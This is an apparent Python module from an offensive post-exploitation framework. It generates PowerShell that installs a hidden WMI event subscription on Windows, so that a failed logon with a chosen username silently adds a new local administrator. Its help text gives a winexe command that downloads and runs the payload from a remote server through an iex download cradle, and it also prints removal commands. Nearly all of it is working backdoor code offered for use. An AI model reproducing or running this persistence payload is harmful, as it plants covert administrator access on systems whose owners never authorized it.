#!/usr/bin/python
import sys
from support.setting import setting



class create:
    #define info here

    info = '''
This is the failsafe for windows persistence module.  After installing on a target, failing to login with 'FailName' will create an admin account called "CreateName"

Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.

Ex:
winexe -U user%password //192.168.0.100 "powershell -c iex(New-Object Net.WebClient).DownloadString('http://192.168.0.136:8080/persist')"

''' 
    #create a list of possible options
    option_list=["FailName","CreateName","password","filter","consumer","output_file"]
   

    #initialize variables
     
    FailName=setting("FailName","",True,"Name to fail logon")
    CreateName=setting("CreateName","",True,"New Username to add")
    password=setting("password","password",True,"PW for new user")
    filter=setting("filter","ServiceFilter",True,"name of WMI filter")   
    consumer=setting("consumer","ServiceConsumer",True,"name of WMI consumer")
    output_file=setting("output_file","",False,"local output filename")
    
    #initialize power_beacon class
    def __init__(self):
        self.name="powerbeacon"
    def run(self) :

        FailName=self.FailName.value
        password=self.password.value
        CreateName=self.CreateName.value
        filter=self.filter.value
        consumer=self.consumer.value
        output=self.output_file.value
         
        data= '''
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query ="select * from __InstanceCreationEvent where TargetInstance isa 'Win32_NtLogEvent' and TargetInstance.logfile = 'Security' and (TargetInstance.EventCode = '4625')"
$instanceFilter.Name = "%s"
$instanceFilter.EventNamespace = 'root\cimv2'
$result = $instanceFilter.Put()
$newFilter = $result.Path
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance()
$instanceConsumer.Name = '%s' 
$instanceConsumer.CommandLineTemplate  = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -c "if(wevtutil qe security /rd:true /f:text /c:1 /q:`"*[System/EventID=4625]`" | findstr /i %s){cmd /c net users %s %s /add `&`& net localgroup administrators %s /add}"'
$result = $instanceConsumer.Put()
$newConsumer = $result.Path
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path

''' % (filter,consumer,FailName,CreateName,password,CreateName)

        remove_data= '''
auditpol /set /subcategory:"Logon" /success:enable /failure:disable
net users %s /delete
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete() 
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""' 
([wmi]$x).Delete() 
''' % (CreateName,filter,consumer,consumer,filter)
        
        if output=='':
            print data
            print "\n"
            print "To Remove"
            print "---------------------------------"
            print remove_data
            return
        else:
            output="output/"+output
            f = open(output,'w')
            f.write(data)
            f.close()
            output=output+"_remove"
            f = open(output,'w')
            f.write(remove_data)
            f.close()
            print "Files have been written..."
            return




